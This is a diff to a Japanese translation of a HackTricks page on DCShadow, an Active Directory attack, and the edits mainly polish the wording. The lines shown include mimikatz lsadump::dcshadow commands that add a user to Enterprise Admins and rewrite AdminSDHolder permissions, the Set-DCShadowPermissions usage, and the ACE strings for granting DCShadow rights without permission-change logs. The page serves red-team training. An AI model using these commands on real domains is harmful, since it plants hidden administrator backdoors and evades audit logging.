@@ -52,7 +52,7 @@ DA またはこの最小限の権限を持つユーザーから変更をプッ�
 * _WriteProperty_ (書き込みではない)
 
 [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) を使用して、特権のないユーザーにこれらの権限を付与できます (これによりいくつかのログが残ることに注意してください)。これは DA 権限を持つよりもはるかに制限されています。\
-例えば: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` これは、ユーザー名 _**student1**_ がマシン _**mcorp-student1**_ にログインしているときに、オブジェクト _**root1user**_ に対して DCShadow 権限を持つことを意味します。
+例えば: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  これは、ユーザー名 _**student1**_ がマシン _**mcorp-student1**_ にログインしているときに、オブジェクト _**root1user**_ に対して DCShadow 権限を持つことを意味します。
 
 ## DCShadow を使用してバックドアを作成する
 
@@ -68,7 +68,7 @@ lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
 {% endcode %}
 
-{% code title="AdminSDHolderのntSecurityDescriptorを変更する（ユーザーにフルコントロールを与える）" %}
+{% code title="AdminSDHolderのntSecurityDescriptorを変更する（ユーザーにフルコントロールを付与する）" %}
 ```bash
 #First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
 (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
@@ -79,7 +79,7 @@ lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attr
 
 ## Shadowception - DCShadowの権限をDCShadowを使用して付与する（変更された権限ログなし）
 
-次のACEをユーザーのSIDで末尾に追加する必要があります：
+次のACEをユーザーのSIDの末尾に追加する必要があります：
 
 * ドメインオブジェクト上：
 * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
@@ -91,12 +91,9 @@ lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attr
 
 オブジェクトの現在のACEを取得するには：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
 
-この場合、**いくつかの変更を行う必要がある**ことに注意してください。したがって、**mimikatz1セッション**（RPCサーバー）で、行いたい各変更に対して**`/stack`パラメータを使用**してください。この方法で、すべてのスタックされた変更をルージュサーバーで実行するために**`/push`**を1回だけ実行する必要があります。
+この場合、**いくつかの変更を行う必要がある**ことに注意してください。したがって、**mimikatz1セッション**（RPCサーバー）で、行いたい各変更に対して**`/stack`パラメータを使用**します。この方法で、すべてのスタックされた変更をルージュサーバーで実行するために**`/push`**を一度だけ実行する必要があります。
 
-
-
-[**DCShadowに関する詳細情報はired.teamをご覧ください。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
-
+[**ired.teamのDCShadowに関する詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 {% hint style="success" %}
 AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -107,7 +104,7 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 <summary>HackTricksをサポートする</summary>
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
 * **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
